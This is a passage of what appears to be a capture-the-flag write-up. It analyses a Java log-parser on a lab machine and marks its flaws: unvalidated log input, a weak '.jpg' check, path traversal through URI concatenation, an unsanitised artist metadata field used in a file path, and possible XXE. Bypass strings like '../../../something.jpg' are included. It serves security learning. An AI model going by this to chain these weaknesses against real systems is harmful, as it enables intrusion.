+            <button class="copy-button" state="copy" data="package%20com.logparser;%0aimport%20java.io.*;%0aimport%20java.util.*;%0aimport%20com.drew.imaging.*;%0aimport%20com.drew.metadata.*;%0aimport%20org.jdom2.*;%0a//%20ETC%20[Cut%20for%20brevity]">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.logparser;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.imaging.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.drew.metadata.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.jdom2.*;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> ETC <span style="color:#f92672">[</span>Cut <span style="color:#66d9ef">for</span> brevity<span style="color:#f92672">]</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This section declares the package and imports necessary libraries for file handling, collections, image metadata reading, and XML processing.</li>
+</ul>
+</li>
+<li>
+<p><strong>&ldquo;parselog&rdquo; Function - Parses log lines containing status code, IP, user agent, and URI separated by</strong> <code>||</code></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20Map%20parseLog%28String%20line%29%20%7b%0a%20%20%20%20String[]%20strings%20=%20line.split%28%22%5c%5c%7c%5c%5c%7c%22%29;%0a%20%20%20%20Map%20map%20=%20new%20HashMap%3c%3e%28%29;%0a%20%20%20%20map.put%28%22status_code%22,%20Integer.parseInt%28strings[0]%29%29;%0a%20%20%20%20map.put%28%22ip%22,%20strings[1]%29;%0a%20%20%20%20map.put%28%22user_agent%22,%20strings[2]%29;%0a%20%20%20%20map.put%28%22uri%22,%20strings[3]%29;%0a%20%20%20%20return%20map;%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span>(String line) {
+</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> strings <span style="color:#f92672">=</span> line.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\|\\|&#34;</span>);
+</span></span><span style="display:flex;"><span>    Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;status_code&#34;</span>, Integer.<span style="color:#a6e22e">parseInt</span>(strings<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>));
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;ip&#34;</span>, strings<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;user_agent&#34;</span>, strings<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;uri&#34;</span>, strings<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> map;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This method parses log lines that are separated by &ldquo;||&rdquo;. It extracts the following information and maps them to variables:
+<ul>
+<li>HTTP status code = <code>status_code</code></li>
+<li>IP address = <code>ip</code></li>
+<li>User agent = <code>user_agent</code></li>
+<li>URI = <code>uri</code></li>
+</ul>
+</li>
+<li>This function expects log entries in the format:
+<ul>
+<li><code>status_code||ip||user_agent||uri</code>.</li>
+<li>Example: <code>200||192.168.1.1||Mozilla/5.0||/images/cat.jpg</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Method &ldquo;isImage&rdquo; checks if a filename contains <code>.jpg</code> extension</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20boolean%20isImage%28String%20filename%29%20%7b%0a%20%20%20%20if%28filename.contains%28%22.jpg%22%29%29%20%7b%0a%20%20%20%20%20%20%20%20return%20true;%0a%20%20%20%20%7d%0a%20%20%20%20return%20false;%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span>(String filename) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(filename.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;.jpg&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>A simple check to determine if a filename refers to a JPG image.</li>
+<li>+Note+: This is a very basic check that only looks for &ldquo;.jpg&rdquo; in the filename.</li>
+</ul>
+</li>
+<li>
+<p><strong>Extracts Artist tag from JPEG metadata using the image&rsquo;s URI</strong></p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20String%20getArtist%28String%20uri%29%20throws%20IOException,%20JpegProcessingException%20%7b%0a%20%20%20%20String%20fullpath%20=%20%22/opt/panda_search/src/main/resources/static%22%20&#43;%20uri;%0a%20%20%20%20File%20jpgFile%20=%20new%20File%28fullpath%29;%0a%20%20%20%20Metadata%20metadata%20=%20JpegMetadataReader.readMetadata%28jpgFile%29;%0a%20%20%20%20for%28Directory%20dir%20:%20metadata.getDirectories%28%29%29%20%7b%0a%20%20%20%20%20%20%20%20for%28Tag%20tag%20:%20dir.getTags%28%29%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%28tag.getTagName%28%29%20==%20%22Artist%22%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20tag.getDescription%28%29;%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%20%20%20%20return%20%22N/A%22;%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span>(String uri) <span style="color:#66d9ef">throws</span> IOException, JpegProcessingException {
+</span></span><span style="display:flex;"><span>    String fullpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span style="color:#f92672">+</span> uri;
+</span></span><span style="display:flex;"><span>    File jpgFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(fullpath);
+</span></span><span style="display:flex;"><span>    Metadata metadata <span style="color:#f92672">=</span> JpegMetadataReader.<span style="color:#a6e22e">readMetadata</span>(jpgFile);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(Directory dir : metadata.<span style="color:#a6e22e">getDirectories</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(Tag tag : dir.<span style="color:#a6e22e">getTags</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(tag.<span style="color:#a6e22e">getTagName</span>() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Artist&#34;</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> tag.<span style="color:#a6e22e">getDescription</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;N/A&#34;</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>This method</strong>:
+<ol>
+<li>Constructs a full path to an image file by reading the <code>uri</code> string variable passed from the <code>parseLog</code> and main logic functions:</li>
+<li>Reads the JPEG metadata.
+<ol>
+<li>Searches through metadata tags to find the &ldquo;Artist&rdquo; tag</li>
+<li>Returns the artist name  or &ldquo;N/A&rdquo; if no artist name is found in the metadata.
+<ul>
+<li>If data is found it&rsquo;s stored in the returned value of the &ldquo;artist&rdquo; string/variable</li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Updates view counts in XML file for specific image and total views</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span>(String path, String uri) <span style="color:#66d9ef">throws</span> JDOMException, IOException {
+</span></span><span style="display:flex;"><span>    SAXBuilder saxBuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder();
+</span></span><span style="display:flex;"><span>    XMLOutputter xmlOutput <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> XMLOutputter();
+</span></span><span style="display:flex;"><span>    xmlOutput.<span style="color:#a6e22e">setFormat</span>(Format.<span style="color:#a6e22e">getPrettyFormat</span>());
+</span></span><span style="display:flex;"><span>    File fd <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(path);
+</span></span><span style="display:flex;"><span>    Document doc <span style="color:#f92672">=</span> saxBuilder.<span style="color:#a6e22e">build</span>(fd);
+</span></span><span style="display:flex;"><span>    Element rootElement <span style="color:#f92672">=</span> doc.<span style="color:#a6e22e">getRootElement</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(Element el: rootElement.<span style="color:#a6e22e">getChildren</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(el.<span style="color:#a6e22e">getName</span>() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;image&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(el.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;uri&#34;</span>).<span style="color:#a6e22e">getText</span>().<span style="color:#a6e22e">equals</span>(uri)) {
+</span></span><span style="display:flex;"><span>                Integer totalviews <span style="color:#f92672">=</span> Integer.<span style="color:#a6e22e">parseInt</span>(rootElement.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;totalviews&#34;</span>).<span style="color:#a6e22e">getText</span>()) <span style="color:#f92672">+</span> 1;
+</span></span><span style="display:flex;"><span>                rootElement.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;totalviews&#34;</span>).<span style="color:#a6e22e">setText</span>(Integer.<span style="color:#a6e22e">toString</span>(totalviews));
+</span></span><span style="display:flex;"><span>                Integer views <span style="color:#f92672">=</span> Integer.<span style="color:#a6e22e">parseInt</span>(el.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;views&#34;</span>).<span style="color:#a6e22e">getText</span>());
+</span></span><span style="display:flex;"><span>                el.<span style="color:#a6e22e">getChild</span>(<span style="color:#e6db74">&#34;views&#34;</span>).<span style="color:#a6e22e">setText</span>(Integer.<span style="color:#a6e22e">toString</span>(views <span style="color:#f92672">+</span> 1));
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    BufferedWriter writer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedWriter(<span style="color:#66d9ef">new</span> FileWriter(fd));
+</span></span><span style="display:flex;"><span>    xmlOutput.<span style="color:#a6e22e">output</span>(doc, writer);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This method updates view counts in an XML file:
+<ol>
+<li>Opens and parses an XML file</li>
+<li>Finds the matching image entry by URI</li>
+<li>Increments both the total views counter and the specific image&rsquo;s view counter</li>
+<li>Saves the updated XML file
+<ul>
+<li>+Important+: If we can write to this I may be able to xploVV</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Main method processes log file to update view counts for JPG images based on artist</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20void%20main%28String[]%20args%29%20throws%20JDOMException,%20IOException,%20JpegProcessingException%20%7b%0a%20%20%20%20File%20log_fd%20=%20new%20File%28%22/opt/panda_search/redpanda.log%22%29;%0a%20%20%20%20Scanner%20log_reader%20=%20new%20Scanner%28log_fd%29;%0a%20%20%20%20//Reads%20the%20log%20file%20line%20by%20line%20&amp;%20stores%20in%20variable%20%22line%22%0a%20%20%20%20while%28log_reader.hasNextLine%28%29%29%20%7b%0a%20%20%20%20%20%20%20%20String%20line%20=%20log_reader.nextLine%28%29;%0a%0a%20%20%20%20%20%20%20%20//%20Checks%20if%20the%20substring%20%22.jpg%22%20is%20found%20in%20the%20%22line%22%20string%0a%20%20%20%20%20%20%20%20if%28!isImage%28line%29%29%20%7b%0a%20%20%20%20%20%20%20%20//%20If%20the%20substring%20%22.jpg%22%20is%20found%20it%20continues%20and%20passes%20the%20data%20to%20the%20parselog%20function%0a%20%20%20%20%20%20%20%20%20%20%20%20continue;%0a%20%20%20%20%20%20%20%20%7d%0a%0a%20%20%20%20%20%20%20%20Map%20parsed_data%20=%20parseLog%28line%29;%20//%22line%22%20variable%20passed%20to%20the%20parseLog%20function%0a%0a%20%20%20%20%20%20%20%20//%20Once%20the%20data%20is%20parsed%20it%27s%20then%20returned%20in%20the%20%22parsed_data%22%20variable%20here%20where%0a%20%20%20%20%20%20%20%20System.out.println%28parsed_data.get%28%22uri%22%29%29;%0a%20%20%20%20%20%20%20%20String%20artist%20=%20getArtist%28parsed_data.get%28%22uri%22%29.toString%28%29%29;%0a%0a%20%20%20%20%20%20%20%20//%20Reads%20the%20artist%20string%20that%20is%20returned%20from%20the%20%22getArtist%22%20function.%0a%20%20%20%20%20%20%20%20System.out.println%28%22Artist:%20%22%20&#43;%20artist%29;%0a%0a%20%20%20%20%20%20%20%20//%20Value%20of%20artist%20string%20is%20concatenated%20with%20%22/credits/%22%20&amp;%20%22_creds.xml%22%20to%20create%20the%20full%20path%20of%20the%20variable%20xmlpath%0a%0a%20%20%20%20%20%20%20%20//%20This%20looks%20to%20be%20vulnerable%20as%20it%27s%20not%20bine%20sanitised.%20It%20just%20takes%20the%20information%20from%20the%20artist%20field%20of%20an%20image%20and%20adds%20it%20here.%0a%20%20%20%20%20%20%20%20String%20xmlPath%20=%20%22/credits/%22%20&#43;%20artist%20&#43;%20%22_creds.xml%22;%0a%20%20%20%20%20%20%20%20addViewTo%28xmlPath,%20parsed_data.get%28%22uri%22%29.toString%28%29%29;%0a%20%20%20%20%7d%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> JDOMException, IOException, JpegProcessingException {
+</span></span><span style="display:flex;"><span>    File log_fd <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(<span style="color:#e6db74">&#34;/opt/panda_search/redpanda.log&#34;</span>);
+</span></span><span style="display:flex;"><span>    Scanner log_reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Scanner(log_fd);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//Reads the log file line by line &amp; stores in variable &#34;line&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(log_reader.<span style="color:#a6e22e">hasNextLine</span>()) {
+</span></span><span style="display:flex;"><span>        String line <span style="color:#f92672">=</span> log_reader.<span style="color:#a6e22e">nextLine</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Checks if the substring &#34;.jpg&#34; is found in the &#34;line&#34; string</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>isImage(line)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// If the substring &#34;.jpg&#34; is found it continues and passes the data to the parselog function</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Map parsed_data <span style="color:#f92672">=</span> parseLog(line); <span style="color:#75715e">//&#34;line&#34; variable passed to the parseLog function</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Once the data is parsed it&#39;s then returned in the &#34;parsed_data&#34; variable here where</span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(parsed_data.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;uri&#34;</span>));
+</span></span><span style="display:flex;"><span>        String artist <span style="color:#f92672">=</span> getArtist(parsed_data.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;uri&#34;</span>).<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Reads the artist string that is returned from the &#34;getArtist&#34; function.</span>
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;Artist: &#34;</span> <span style="color:#f92672">+</span> artist);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Value of artist string is concatenated with &#34;/credits/&#34; &amp; &#34;_creds.xml&#34; to create the full path of the variable xmlpath</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// This looks to be vulnerable as it&#39;s not bine sanitised. It just takes the information from the artist field of an image and adds it here.</span>
+</span></span><span style="display:flex;"><span>        String xmlPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/credits/&#34;</span> <span style="color:#f92672">+</span> artist <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_creds.xml&#34;</span>;
+</span></span><span style="display:flex;"><span>        addViewTo(xmlPath, parsed_data.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;uri&#34;</span>).<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>The main method ties everything together</strong>:
+<ol>
+<li>Reads the log file line by line:
+<ul>
+<li>+Important+: This is the log file our user has write privileges over so we may be able to inject malicious code by placing it in this file and having it execute.</li>
+</ul>
+</li>
+<li>Skips non-image entries</li>
+<li>Parses each log line</li>
+<li>Extracts the artist from the image metadata</li>
+<li>Updates view counts in the corresponding artist&rsquo;s XML credit file
+<ul>
+<li>+Important+: As the program parses XML data as one of it&rsquo;s functions we may be able to perform and XXE (XML External Entity Attack)</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Simply Explained</strong>: Overall, this application appears to be a log parser for the photo viewing application that runs.</p>
+<ul>
+<li>Processes logs of image views</li>
+<li>Extracts artist information from image metadata</li>
+<li>Maintains view counts per image and artist in XML files</li>
+<li>Specifically tracks JPG images viewed through the web interface</li>
+</ul>
+</li>
+</ul>
+<h3 id="why-the-code-is-vulnerable">Why The Code Is Vulnerable:</h3>
+<p>The code contains multiple critical vulnerabilities that chain together. Let&rsquo;s me explain the key vulnerable components:</p>
+<h4 id="vulnerable-log-parsing">Vulnerable Log Parsing:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20Map%20parseLog%28String%20line%29%20%7b%0a%20%20%20%20//%20VULNERABILITY:%20No%20input%20validation%0a%20%20%20%20String[]%20strings%20=%20line.split%28%22%5c%5c%7c%5c%5c%7c%22%29;%0a%20%20%20%20Map%20map%20=%20new%20HashMap%3c%3e%28%29;%0a%20%20%20%20map.put%28%22status_code%22,%20Integer.parseInt%28strings[0]%29%29;%0a%20%20%20%20map.put%28%22ip%22,%20strings[1]%29;%0a%20%20%20%20map.put%28%22user_agent%22,%20strings[2]%29;%0a%20%20%20%20map.put%28%22uri%22,%20strings[3]%29;%0a%20%20%20%20return%20map;%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map <span style="color:#a6e22e">parseLog</span>(String line) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: No input validation</span>
+</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> strings <span style="color:#f92672">=</span> line.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\|\\|&#34;</span>);
+</span></span><span style="display:flex;"><span>    Map map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;status_code&#34;</span>, Integer.<span style="color:#a6e22e">parseInt</span>(strings<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>));
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;ip&#34;</span>, strings<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;user_agent&#34;</span>, strings<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;uri&#34;</span>, strings<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> map;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Accepts log entries without validation</li>
+<li>Expects format: <code>status_code||ip||user_agent||uri</code></li>
+<li>Example: <code>200||192.168.1.1||Mozilla/5.0||/images/cat.jpg</code></li>
+<li>Can be manipulated to inject malicious URIs</li>
+</ul>
+<h4 id="weak-image-validation">Weak Image Validation:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20boolean%20isImage%28String%20filename%29%20%7b%0a%20%20%20%20//%20VULNERABILITY:%20Basic%20string%20check%20only%0a%20%20%20%20if%28filename.contains%28%22.jpg%22%29%29%20%7b%0a%20%20%20%20%20%20%20%20return%20true;%0a%20%20%20%20%7d%0a%20%20%20%20return%20false;%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isImage</span>(String filename) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: Basic string check only</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(filename.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;.jpg&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Only checks for &ldquo;.jpg&rdquo; substring</li>
+<li>Can be bypassed with:
+<ul>
+<li>Path traversal: <code>../../../something.jpg</code></li>
+<li>Double extensions: <code>malicious.php.jpg</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="unsafe-artist-metadata-extraction">Unsafe Artist Metadata Extraction:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20String%20getArtist%28String%20uri%29%20throws%20IOException,%20JpegProcessingException%20%7b%0a%20%20%20%20//%20VULNERABILITY:%20Direct%20path%20concatenation%0a%20%20%20%20String%20fullpath%20=%20%22/opt/panda_search/src/main/resources/static%22%20&#43;%20uri;%0a%20%20%20%20File%20jpgFile%20=%20new%20File%28fullpath%29;%0a%20%20%20%20Metadata%20metadata%20=%20JpegMetadataReader.readMetadata%28jpgFile%29;%0a%20%20%20%20//%20VULNERABILITY:%20No%20validation%20on%20metadata%0a%20%20%20%20for%28Directory%20dir%20:%20metadata.getDirectories%28%29%29%20%7b%0a%20%20%20%20%20%20%20%20for%28Tag%20tag%20:%20dir.getTags%28%29%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20if%28tag.getTagName%28%29%20==%20%22Artist%22%29%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20tag.getDescription%28%29;%0a%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%20%20%20%20%7d%0a%20%20%20%20%7d%0a%20%20%20%20return%20%22N/A%22;%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">getArtist</span>(String uri) <span style="color:#66d9ef">throws</span> IOException, JpegProcessingException {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: Direct path concatenation</span>
+</span></span><span style="display:flex;"><span>    String fullpath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/opt/panda_search/src/main/resources/static&#34;</span> <span style="color:#f92672">+</span> uri;
+</span></span><span style="display:flex;"><span>    File jpgFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(fullpath);
+</span></span><span style="display:flex;"><span>    Metadata metadata <span style="color:#f92672">=</span> JpegMetadataReader.<span style="color:#a6e22e">readMetadata</span>(jpgFile);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: No validation on metadata</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(Directory dir : metadata.<span style="color:#a6e22e">getDirectories</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(Tag tag : dir.<span style="color:#a6e22e">getTags</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(tag.<span style="color:#a6e22e">getTagName</span>() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;Artist&#34;</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> tag.<span style="color:#a6e22e">getDescription</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;N/A&#34;</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Direct URI concatenation enables path traversal</li>
+<li>No validation of metadata values</li>
